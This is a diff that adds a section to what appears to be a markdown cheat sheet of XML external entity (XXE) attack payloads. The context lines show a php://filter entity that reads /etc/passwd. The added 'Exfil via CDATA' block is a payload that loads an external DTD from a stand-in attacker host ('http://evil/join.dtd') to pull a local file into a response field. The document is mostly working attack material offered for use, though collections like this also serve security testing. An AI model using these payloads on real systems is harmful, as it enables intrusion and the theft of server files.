@@ -93,6 +93,23 @@ daemon:x:1:1:daemon:/usr/sbin:/bin/sh
 <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd" >
 ```
 
+### Exfil via CDATA
+
+```
+<!DOCTYPE updateProfile [
+  <!ENTITY % file SYSTEM "file:///has/broken/xml">
+  <!ENTITY % start "<![CDATA[">
+  <!ENTITY % end "]]>">
+  <!ENTITY % dtd SYSTEM "http://evil/join.dtd">
+  %dtd;
+]]>
+...
+<lastname>&all;</lastname>
+
+# join.dtd
+<!ENTITY all "%start;%file;%end;">
+```
+
 # Caveats / Gotchas
 
 * Sometimes servers are behind firewalls, so send requests on port 80 by default [1]
